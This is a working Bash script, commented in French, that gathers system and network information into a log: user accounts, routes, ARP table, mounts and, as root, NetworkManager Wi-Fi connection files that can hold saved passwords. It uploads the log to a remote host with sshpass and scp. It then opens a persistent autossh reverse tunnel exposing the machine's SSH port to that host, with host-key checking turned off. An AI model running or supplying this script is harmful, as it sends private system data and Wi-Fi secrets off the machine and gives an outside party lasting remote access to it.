#!/bin/bash
#-*- coding: UTF8 -*-

#--------------------------------------------------#
# Script_Name: reverse_ssh_access.sh	                               
#                                                   
# Author:  'dossantosjdf@gmail.com'                 
# Date: mar. 08 mars 2022 19:26:20                                             
# Version: 1.0                                      
# Bash_Version: 5.0.17(1)-release                                     
#--------------------------------------------------#
# Description:                                      
#                                                   
#                                                   
# Options:                                          
#                                                   
# Usage: ./reverse_ssh_access.sh                                            
#                                                   
# Limits:                                           
#                                                   
# Licence:                                          
#--------------------------------------------------#

### Fonctions ###
exit_clean() {
  echo '#--------------------------------------->'  
  rm -rf $log_file_name
  # rm -rf $0
}

log_mode_root() {
  {
    echo -e "\n Interfaces WIFI \n -------------"
    awk '/(connection|wifi|wifi-security)/,/^$/' /etc/NetworkManager/system-connections/*.nmconnection || echo "Pas d'interface WIFI"
    echo -e "\n Ports réseau \n -------------"
    command -v ss > /dev/null && ss -autnp
    echo ""
  } >> $log_file_name
}

log_mode_no_root() {
  {
    echo -e "\n Informations PC \n ------------------------------------>"
    date
    echo -e "\n OS : $OSTYPE \n -------------"
    echo "Dist : $linux_dist"
    echo "Ver : $linux_dist_ver"
    echo "Uptime : $(uptime)"
    echo -e "\n IP publique : $their_ip_pub"
    echo -e "\n Informations interfaces réseau \n -------------"
    command -v ip > /dev/null && ip a || ifconfig
    echo -e "\n Ports réseau \n -------------"
    command -v ss > /dev/null && ss -autnp
    echo -e "\n Fichier Hosts \n -------------"
    cat /etc/hosts
    echo -e "\n Fichier Hostname \n -------------"
    cat /etc/hostname
    echo -e "\n Fichier DNS \n -------------"
    cat /etc/resolv.conf
    echo -e "\n Table ARP \n -------------"
    command -v ip > /dev/null && ip n || cat  /proc/net/arp
    echo -e "\n Routes \n -------------"
    command -v ip > /dev/null && ip route
    echo -e "\n Utilisateurs \n -------------"
    cat /etc/passwd
    echo -e "\n Informations système \n -------------"
    command -v hostnamectl > /dev/null && hostnamectl status
    echo -e "\n PCI \n -------------"
    lspci
    echo -e "\n Mémoire RAM \n -------------"
    free -h
    echo -e "\n FSTAB \n -------------"
    cat /etc/fstab
    echo -e "\n Partitions montées \n -------------"
    grep '^/dev/[^loop].\+' /proc/mounts
    echo -e "\n Partitions disque \n -------------"
    df -h
    echo -e "\n Kernel info \n -------------"
    uname -a
    echo ""
  } > $log_file_name
}

### Global variables ###
readonly host_r='xxx.xxx.xxx.xxx' # Remote host
readonly user_r='ruzer'       # Remote user

readonly port_con='443'       # Port tunnel

readonly port_f='2211'       # Port forward 22110 >> 22
readonly port_l='22'          # Port local

readonly their_ip_pub="$(wget -qO- ifconfig.me)"          # Ports local

readonly log_ip_pub="$(echo $their_ip_pub | tr '.' '-')"
readonly today="$(date +'%Y-%m-%d-%H-%M-%S')"
readonly log_file_name="${log_ip_pub}_${today}.txt"

declare -a tab_inst_app

### Main ###
trap exit_clean EXIT

clear

cat << "EOF"
 ____     __         __               __  _     
|  _ \   / /         \ \             / / | |    
| |_) | / /_____ _____\ \_____ _____/ /  | |    
|  _ <  \ \_____|_____/ /_____|_____\ \  | |___ 
|_| \_\  \_\         /_/             \_\ |_____|
                                                
EOF

if [ $UID -ne 0 ]
then
  while [ -z "$no_root" ]
  do
    echo -e "\n Exécution en tant que root = fichiier de log complet"
    echo -e " Exécution non root = fichiier de log incomplet \n"    
    read -p "Voulez-vous exécuter le script en tant que root ? [o/n] : " no_root
    echo ""
    if [[ $no_root =~ ^([oO][uU][iI]|[yY][eE][sS]|[oO]|[yY])$ ]]
    then
      echo -e "\n Mode non root \n"
      if (command -v sudo > /dev/null)
      then
        script_n="$(basename $0)"
        exec sudo ./${script_n} || exit 1
      else
        exec su -c $0 root || exit 1
      fi
    elif [[ $no_root =~ ^([nN][oO][Nn]|[Nn][oO]|[nN])$ ]]
    then
      echo -e "\n Mode non root \n"
    else
      echo "Erreur de saisie"
      unset no_root
    fi
  done
fi

# Check linux distribution
if [[ "$OSTYPE" =~ linux* ]]
then
  if [[ -f /etc/os-release ]]
  then
    readonly linux_dist="$(grep "^ID=" /etc/os-release | cut -d '=' -f2)"
    readonly linux_dist_ver="$(grep "^VERSION_ID=" /etc/os-release | cut -d '=' -f2)"
  fi
else
  echo "$OSTYPE non compatible"
  exit 1
fi

while [ -z "$pass_r" ]
do
  read -rsp "Saisir le mot de passe de la machine distante : " pass_r
  echo -e "\n"
done
  
# Check package manager and install deps
echo "Update system and install deps ..."

tab_inst_app=('openssh-client' 'autossh' 'sshpass' 'wget')

case $linux_dist in
debian|ubuntu) 
  for item in "${tab_inst_app[@]}"
  do
    command -v $item > /dev/null || (apt update -q && apt install $item -yq || exit 1)
  done
  ;;
centos|fedora|almalinux|rocky)
  for item in "${tab_inst_app[@]}"
  do         
    command -v $item > /dev/null || (dnf check-update --refresh -yq && dnf install $item -yq || exit 1)
  done
  ;;
arch)
  for item in "${tab_inst_app[@]}"
  do
    command -v ${item/openssh-client/ssh} > /dev/null || (pacman -Syq && pacman -S ${item%-client} --noconfirm || exit 1)  
  done
  ;;
*)
  echo "Gestionnaire de paquets non prit en charge"
  exit 1
  ;;  
esac

echo "Send logs ..."

log_mode_no_root

if [ $UID = '0' ]
then
  log_mode_root
fi

sshpass -p $pass_r scp -P $port_con -pq $log_file_name ${user_r}@${host_r}:/home/${user_r} 

echo "Start RSSH ..."
echo -e "\n Pour se connecter : ssh -p $port_f <USER>@127.0.0.1"

sshpass -p $pass_r autossh -M0 -N -T -q \
  -o 'ServerAliveInterval 30' \
  -o 'ServerAliveCountMax 3' \
  -o 'StrictHostKeyChecking=no' \
  -R ${port_f}:localhost:${port_l} -p $port_con ${user_r}@${host_r} &
    
readonly pid_rssh="$!"

sshpass -p $pass_r ssh -p $port_con ${user_r}@${host_r} "echo "Pour arrêter le tunnel -----  kill $pid_rssh" >> /home/${user_r}/${log_file_name}"

echo -e "\n Pour arrêter le tunnel : kill $pid_rssh \n"
